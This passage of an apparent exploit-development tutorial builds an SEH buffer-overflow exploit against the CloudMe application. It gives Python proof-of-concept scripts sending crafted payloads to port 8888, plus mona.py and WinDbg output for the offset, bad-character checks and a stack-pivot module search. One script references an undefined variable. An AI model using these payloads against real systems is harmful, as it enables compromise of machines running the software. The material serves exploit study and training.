payload+="r6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0C"
payload+="u1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5C"
payload+="w6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0C"
payload+="z1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5D"
payload+="b6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0D"
payload+="e1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5D"
payload+="g6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0D"
payload+="j1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5D"
payload+="l6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0D"
payload+="o1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5D"
payload+="q6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0D"
payload+="t1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5D"
payload+="v6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0D"
payload+="y1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5E"
payload+="a6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0E"
payload+="d1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5E"
payload+="f6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0E"
payload+="i1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5E"
payload+="k6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0E"
payload+="n1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5E"
payload+="p6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0E"
payload+="s1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5E"
payload+="u6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0E"
payload+="x1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5E"
payload+="z6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0F"
payload+="c1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5F"
payload+="e6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0F"
payload+="h1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5F"
payload+="j6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0F"
payload+="m1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5F"
payload+="o6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0F"
payload+="r1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5F"
payload+="t6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0F"
payload+="w1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5F"
payload+="y6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0G"
payload+="b1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5G"
payload+="d6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0G"
payload+="g1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5G"
payload+="i6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk"

try:
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,8888))
    s.send(payload)
except Exception as e:
    print(sys.exc_value)
```

<p align="justify">After we run the python script above, we see that the <b>nseh</b> and <b>seh</b> values are changed</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
0:000> !exchain
0022d908: USER32!___PchSym_  (USER32+0x83577)+0 (77433577)
Invalid exception stack at 43347743
</pre>

<p align="justify">As shown above, the <b>nseh</b> was overwritten with the pattern <b>43347743</b> and <b>SEH</b> was overwritten with the pattern <b>77433577</b>. However, because DEP is enabled, we can not simply pivot to <b>nseh</b> and run instructions from the stack. At this point we are only interested in the offset of <b>SEH</b>. Using <b>mona.py</b> we will calculate the offset of <strong>SEH</strong> as follows</p>


<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
0:000> !load pykd.pyd
0:000> !py mona pattern_offset 77433577
Hold on...
[+] Command used:
!py C:\Program Files\Windows Kits\8.0\Debuggers\x86\mona.py pattern_offset 77433577
Looking for w5Cw in pattern of 500000 bytes
 - Pattern w5Cw (0x77433577) found in cyclic pattern at position 2236
Looking for w5Cw in pattern of 500000 bytes
Looking for wC5w in pattern of 500000 bytes
 - Pattern wC5w not found in cyclic pattern (uppercase)  
Looking for w5Cw in pattern of 500000 bytes
Looking for wC5w in pattern of 500000 bytes
 - Pattern wC5w not found in cyclic pattern (lowercase)  

[+] This mona.py action took 0:00:00.375000
</pre>

<p align="justify">So, the offset that causes the application to crash has been found and now we can control <b>SEH</b> by creating a junk buffer of <b>2236</b> bytes. Now, lets update the previous PoC</p>

```python

import socket
import sys
target = "127.0.0.1"

payload_size = 2236

junk = 'A' * payload_size

seh = "BBBB"

payload = junk + seh 

try:
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,8888))
    s.send(payload)
except Exception as e:
    print(sys.exc_value)
```

<p align="justify">When we run the script above, the following chain shows that we now control the exception handler</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
(794.d1c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000001 ebx=41414141 ecx=762498da edx=0000008a esi=41414141 edi=41414141
eip=41414141 esp=0022d470 ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
41414141 ??              ???
0:000&gt; !exchain
0022d908: 42424242
Invalid exception stack at 41414141
</pre>

<hr />
<h3>3. The Bad Characters</h3>
<p align="justify">At this point, before moving further to exploitation, its time to search for bad characters. First, we will use a hex character generator to generate all the 256 ascii hex characters. A nice hex character generator can be cloned from <a href="https://github.com/cytopia/badchars">here</a>. We can also install badchars in our Kali machine as follows</p>


<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
pip3 install badchars
</pre>

<p align="justify">Then we will generate the hex chars as follows</p>

<!--script id="asciicast-Zgp40P151NjlTYOvmGCeXQFc2" src="https://asciinema.org/a/Zgp40P151NjlTYOvmGCeXQFc2.js" async></script-->
<img style="display: block;margin-left: auto;margin-right: auto;border: 1px solid red;" src="{{ site.baseurl }}/assets/images/2021/02/badchars.gif" alt=""/>

<!--pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
<span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>/home/kali</b></span># badchars -f python
badchars = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
</pre-->

<p align="justify">We will use the hex chars above to identify badchars in our target. In order to do that, we will use the following python script</p>

```python

import sys
import socket

target="127.0.0.1"

badchars = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

buff_size = 6000
payload ='A'*2236
payload += 'BBBB'
payload += bad
payload += 'C'*(buff_size - len(payload))

try:
  s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((target,8888))
  s.send(payload)
except Exception as e:
  print(sys.exc_value)

```

<p align="justify">After we run the script above, we can then explore the dump on the stack in order to search for bad characters.</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
0:000> dd esp L 500
[..snip..]
0022d8c0  41414141 41414141 41414141 41414141
0022d8d0  41414141 41414141 41414141 41414141
0022d8e0  41414141 41414141 41414141 41414141
0022d8f0  41414141 41414141 41414141 41414141
0022d900  41414141 41414141 41414141 42424242
<span style="color:#33cccc;">0022d910</span><span style="color:#ff0000;">  04030201 08070605 0c0b0a09 100f0e0d
</span>0022d920<span style="color:#ff0000;">  14131211 18171615 1c1b1a19 201f1e1d
</span>0022d930<span style="color:#ff0000;">  24232221 28272625 2c2b2a29 302f2e2d
</span>0022d940<span style="color:#ff0000;">  34333231 38373635 3c3b3a39 403f3e3d
</span>0022d950<span style="color:#ff0000;">  44434241 48474645 4c4b4a49 504f4e4d
</span>0022d960<span style="color:#ff0000;">  54535251 58575655 5c5b5a59 605f5e5d
</span>0022d970<span style="color:#ff0000;">  64636261 68676665 6c6b6a69 706f6e6d
</span>0022d980<span style="color:#ff0000;">  74737271 78777675 7c7b7a79 807f7e7d
</span>0022d990<span style="color:#ff0000;">  84838281 88878685 8c8b8a89 908f8e8d
</span>0022d9a0<span style="color:#ff0000;">  94939291 98979695 9c9b9a99 a09f9e9d
</span>0022d9b0<span style="color:#ff0000;">  a4a3a2a1 a8a7a6a5 acabaaa9 b0afaead
</span>0022d9c0<span style="color:#ff0000;">  b4b3b2b1 b8b7b6b5 bcbbbab9 c0bfbebd
</span>0022d9d0<span style="color:#ff0000;">  c4c3c2c1 c8c7c6c5 cccbcac9 d0cfcecd
</span>0022d9e0<span style="color:#ff0000;">  d4d3d2d1 d8d7d6d5 dcdbdad9 e0dfdedd
</span>0022d9f0<span style="color:#ff0000;">  e4e3e2e1 e8e7e6e5 ecebeae9 f0efeeed
</span>0022da00<span style="color:#ff0000;">  f4f3f2f1 f8f7f6f5 fcfbfaf9 </span>43<span style="color:#ff0000;">fffefd</span>
0022da10  43434343 43434343 43434343 43434343
0022da20  43434343 43434343 43434343 43434343
0022da30  43434343 43434343 43434343 43434343
0022da40  43434343 43434343 43434343 43434343
0022da50  43434343 43434343 43434343 43434343
[..snip..]
</pre>

<p align="justify">The dump above shows the hex character set we have sent to the vulnerable application that starts from <b>0x0022d910</b> until <b>0x0022da0b</b> . Now its time to perform the analysis. If we take a closer look at at the character set above we can say that we might not have bad characters, but we must still investigate further in order to be sure. We can do this using <b>mona.py</b> directly from <b>WinDbg</b>. Lets generate the badchars with <b>mona.py</b> as follows</p>


<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
0:000&gt; !load pykd.pyd
0:000&gt; !py mona bytearray -cpb '\x00' 
Hold on...
[+] Command used:
!py C:\Program Files\Windows Kits\8.0\Debuggers\x86\mona.py bytearray -cpb '\x00'
Generating table, excluding 1 bad chars...
Dumping table to file
[+] Preparing output file 'bytearray.txt'
    - (Re)setting logfile c:\logs\CloudMe\bytearray.txt
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"


Done, wrote 255 bytes to file c:\logs\CloudMe\bytearray.txt
Binary output saved in c:\logs\CloudMe\bytearray.bin

[+] This mona.py action took 0:00:00.047000
</pre>

<p align="justify">As we see above, we have already set the log file and we can also see the ascii hex characters generated from <b>mona.py</b>. Also, it is worth to mention that we don't need to include the '\x00' character in our character set, because it could cut off the rest of the characters, as it could be acting as a null terminator. Nevertheless, we can see if it is considered a bad character afterwards.</p>
<p align="justify">Now, we can use the following command to compare the character set generated with <b>mona.py</b>, with the character set we have sent to the vulnerable <b>CloudMe</b> application.</p>


<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
0:000&gt; !py mona compare -f c:\logs\CloudMe\bytearray.bin -a 0x0022d910
Hold on...
[+] Command used:
!py C:\Program Files\Windows Kits\8.0\Debuggers\x86\mona.py compare -f c:\logs\CloudMe\bytearray.bin -a 0x0022d910
[+] Reading file c:\logs\CloudMe\bytearray.bin...
    Read 255 bytes from file
[+] Preparing output file 'compare.txt'
    - (Re)setting logfile c:\logs\CloudMe\compare.txt
[+] Generating module info table, hang on...
    - Processing modules
    - Done. Let's rock 'n roll.
[+] c:\logs\CloudMe\bytearray.bin has been recognized as RAW bytes.
[+] Fetched 255 bytes successfully from c:\logs\CloudMe\bytearray.bin
    - Comparing 1 location(s)
Comparing bytes from file with memory :
0x0022d910 | [+] Comparing with memory at location : 0x0022d910 (Stack)
0x0022d910 | !!! Hooray, normal shellcode unmodified !!!
0x0022d910 | Bytes omitted from input: 00

[+] This mona.py action took 0:00:00.922000
</pre>

<p align="justify">As we see above, we don't have bad characters, so we are good to go. But wait, not yet. Lets generate the badchars again, but at this time lets include the '\x00'. If we compare again the hex chars as we did before, we will see that the null byte considered to be a bad char as it is missing from the chars sent from the exploit.</p>


<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
0:000&gt; !py mona compare -f c:\logs\CloudMe\bytearray.bin -a 0x0022d910
Hold on...
[+] Command used:
!py C:\Program Files\Windows Kits\8.0\Debuggers\x86\mona.py compare -f c:\logs\CloudMe\bytearray.bin -a 0x0022d910
[+] Reading file c:\logs\CloudMe\bytearray.bin...
    Read 256 bytes from file
[+] Preparing output file 'compare.txt'
    - (Re)setting logfile c:\logs\CloudMe\compare.txt
[+] Generating module info table, hang on...
    - Processing modules
    - Done. Let's rock 'n roll.
[+] c:\logs\CloudMe\bytearray.bin has been recognized as RAW bytes.
[+] Fetched 256 bytes successfully from c:\logs\CloudMe\bytearray.bin
    - Comparing 1 location(s)
Comparing bytes from file with memory :
0x0022d910 | [+] Comparing with memory at location : 0x0022d910 (Stack)
0x0022d910 | Only 255 original bytes of 'normal' code found.
0x0022d910 |     ,-----------------------------------------------.
0x0022d910 |     | Comparison results:                           |
0x0022d910 |     |-----------------------------------------------|
0x0022d910 |   0 |00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f| File
0x0022d910 |     |-1                                             | Memory
0x0022d910 |  10 |10 11 12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f| File
0x0022d910 |     |                                               | Memory
0x0022d910 |  20 |20 21 22 23 24 25 26 27 28 29 2a 2b 2c 2d 2e 2f| File
0x0022d910 |     |                                               | Memory
0x0022d910 |  30 |30 31 32 33 34 35 36 37 38 39 3a 3b 3c 3d 3e 3f| File
0x0022d910 |     |                                               | Memory
0x0022d910 |  40 |40 41 42 43 44 45 46 47 48 49 4a 4b 4c 4d 4e 4f| File
0x0022d910 |     |                                               | Memory
0x0022d910 |  50 |50 51 52 53 54 55 56 57 58 59 5a 5b 5c 5d 5e 5f| File
0x0022d910 |     |                                               | Memory
0x0022d910 |  60 |60 61 62 63 64 65 66 67 68 69 6a 6b 6c 6d 6e 6f| File
0x0022d910 |     |                                               | Memory
0x0022d910 |  70 |70 71 72 73 74 75 76 77 78 79 7a 7b 7c 7d 7e 7f| File
0x0022d910 |     |                                               | Memory
0x0022d910 |  80 |80 81 82 83 84 85 86 87 88 89 8a 8b 8c 8d 8e 8f| File
0x0022d910 |     |                                               | Memory
0x0022d910 |  90 |90 91 92 93 94 95 96 97 98 99 9a 9b 9c 9d 9e 9f| File
0x0022d910 |     |                                               | Memory
0x0022d910 |  a0 |a0 a1 a2 a3 a4 a5 a6 a7 a8 a9 aa ab ac ad ae af| File
0x0022d910 |     |                                               | Memory
0x0022d910 |  b0 |b0 b1 b2 b3 b4 b5 b6 b7 b8 b9 ba bb bc bd be bf| File
0x0022d910 |     |                                               | Memory
0x0022d910 |  c0 |c0 c1 c2 c3 c4 c5 c6 c7 c8 c9 ca cb cc cd ce cf| File
0x0022d910 |     |                                               | Memory
0x0022d910 |  d0 |d0 d1 d2 d3 d4 d5 d6 d7 d8 d9 da db dc dd de df| File
0x0022d910 |     |                                               | Memory
0x0022d910 |  e0 |e0 e1 e2 e3 e4 e5 e6 e7 e8 e9 ea eb ec ed ee ef| File
0x0022d910 |     |                                               | Memory
0x0022d910 |  f0 |f0 f1 f2 f3 f4 f5 f6 f7 f8 f9 fa fb fc fd fe ff| File
0x0022d910 |     |                                               | Memory
0x0022d910 |     `-----------------------------------------------'
0x0022d910 | 
0x0022d910 |             | File      | Memory    | Note       
0x0022d910 | -------------------------------------------------
0x0022d910 | 0 0 1   0   | 00        |           | missing    
0x0022d910 | 1 0 255 255 | 01 ... ff | 01 ... ff | unmodified!
0x0022d910 | -------------------------------------------------
0x0022d910 | 
0x0022d910 | Possibly bad chars: 00
0x0022d910 | 

[+] This mona.py action took 0:00:00.875000
</pre>

<p align="justify">At this point we are good to go. We can construct any shellcode now just excluding the null character.</p>
<hr />
<h3>4. Stack Pivoting</h3>
<p align="justify">At this point we need to transfer the execution flow back to the stack area that we control. In order to do this we will use a technique called stack pivot. This action can be accomplished by observing the location of <b>ESP</b> register at the time <b>SEH</b> gets executed in relation to the location of our payload on the stack.</p>
<p align="justify">Before searching any gadget, we should first use <b>mona.py</b> again, to search for modules with no restrictions</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
0:000> !py mona modules
Hold on...
[.....]
</pre>

<p align="justify">If we take a closer look at the modules info table generated from mona, we can see that there are some specific modules with no restrictions at all. Furthermore we have identified one of these modules with no restrictions which is the <b>Qt5Sql.dll</b>. We can use this specific .dll in order to search for gadgets that can help us in stack pivoting.</p>


